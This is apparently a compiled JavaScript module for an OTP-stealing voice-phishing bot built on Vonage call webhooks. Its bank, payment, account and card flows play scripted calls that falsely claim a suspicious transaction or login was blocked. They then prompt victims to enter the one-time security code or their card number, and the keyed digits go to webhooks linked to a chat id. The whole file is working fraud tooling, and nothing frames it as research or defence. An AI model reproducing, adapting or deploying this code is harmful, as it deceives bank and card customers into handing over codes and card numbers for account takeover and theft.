"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.cardFlow = exports.accountFlow = exports.payFlow = exports.bankFlow = void 0;
const bankFlow = (dtmf, res, language, ctx, step) => {
    var _a, _b;
    if (dtmf && dtmf.digits === '1') {
        return res.json([
            {
                action: 'talk',
                text: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id}/${language}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '2') {
        return res.json([
            {
                action: 'talk',
                text: 'For your SECURITY please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the code yet please press the star key followed by the # key',
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_b = ctx.chat) === null || _b === void 0 ? void 0 : _b.id}/${language}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '3') {
        return res.json([
            {
                action: 'talk',
                text: `We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    maxDigits: 1,
                    timeOut: 10,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '*') {
        return res.json([
            {
                action: 'talk',
                text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
                style: 2,
                language: language,
            },
        ]);
    }
    else {
        return res.json([
            {
                action: 'talk',
                text: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    timeOut: 10,
                    maxDigits: 1,
                },
            },
        ]);
    }
};
exports.bankFlow = bankFlow;
const payFlow = (dtmf, res, language, ctx, step, wallet) => {
    var _a, _b;
    if (dtmf && dtmf.digits === '1') {
        return res.json([
            {
                action: 'talk',
                text: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id}/${language}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '2') {
        return res.json([
            {
                action: 'talk',
                text: 'For your SECURITY please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the code yet please press the star key followed by the # key',
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_b = ctx.chat) === null || _b === void 0 ? void 0 : _b.id}/${language}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '3') {
        return res.json([
            {
                action: 'talk',
                text: `We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?wallet=${wallet}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    maxDigits: 1,
                    timeOut: 10,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '*') {
        return res.json([
            {
                action: 'talk',
                text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
                style: 2,
                language: language,
            },
        ]);
    }
    else {
        return res.json([
            {
                action: 'talk',
                text: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?wallet=${wallet}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    timeOut: 10,
                    maxDigits: 1,
                },
            },
        ]);
    }
};
exports.payFlow = payFlow;
const accountFlow = (dtmf, res, language, ctx, step, askCardInfo) => {
    var _a, _b, _c;
    if (dtmf && dtmf.digits === '1') {
        return res.json([
            {
                action: 'talk',
                text: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id}/${language}?askCardInfo=${askCardInfo}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '2') {
        return res.json([
            {
                action: 'talk',
                text: 'For your SECURITY please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the code yet please press the star key followed by the # key',
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_b = ctx.chat) === null || _b === void 0 ? void 0 : _b.id}/${language}?askCardInfo=${askCardInfo}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '3') {
        return res.json([
            {
                action: 'talk',
                text: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_c = ctx.chat) === null || _c === void 0 ? void 0 : _c.id}/${language}?askCardInfo=${askCardInfo}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    maxDigits: 1,
                    timeOut: 10,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '*') {
        return res.json([
            {
                action: 'talk',
                text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
                style: 2,
                language: language,
            },
        ]);
    }
    else {
        return res.json([
            {
                action: 'talk',
                text: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?askCardInfo=${askCardInfo}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    timeOut: 10,
                    maxDigits: 1,
                },
            },
        ]);
    }
};
exports.accountFlow = accountFlow;
const cardFlow = (dtmf, res, language, ctx, step, cardType) => {
    var _a, _b;
    if (dtmf && dtmf.digits === '1') {
        return res.json([
            {
                action: 'talk',
                text: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the # key`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${(_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id}/${language}?cardType=${cardType}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '2') {
        return res.json([
            {
                action: 'talk',
                text: `For your SECURITY, please enter your ${cardType} card number followed by the # key`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${(_b = ctx.chat) === null || _b === void 0 ? void 0 : _b.id}/${language}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    submitOnHash: true,
                    timeOut: 10,
                    maxDigits: 18,
                },
            },
        ]);
    }
    else if (dtmf && dtmf.digits === '3') {
        return res.json([
            {
                action: 'talk',
                text: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?cardType=${cardType}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    maxDigits: 1,
                    timeOut: 10,
                },
            },
        ]);
    }
    else {
        return res.json([
            {
                action: 'talk',
                text: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                style: 2,
                language: language,
                bargeIn: true,
            },
            {
                eventUrl: [
                    `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?cardType=${cardType}`,
                ],
                action: 'input',
                type: ['dtmf'],
                dtmf: {
                    timeOut: 10,
                    maxDigits: 1,
                },
            },
        ]);
    }
};
exports.cardFlow = cardFlow;
